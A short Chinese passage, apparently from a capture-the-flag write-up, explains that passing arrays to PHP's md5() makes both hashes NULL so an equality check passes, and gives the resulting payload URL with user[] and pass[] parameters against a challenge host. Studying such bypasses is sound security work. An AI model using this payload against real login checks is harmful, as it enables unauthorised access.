直接在 md5() 函数传入数组时会报错返回 NULL，当 2 个变量都导致报错返回 NULL 时就能使使得条件成立。构造出 payload 提交：

http://web1.0ops.sjtu.cn:40004/ezhash/index.php?user[]=1&pass[]=0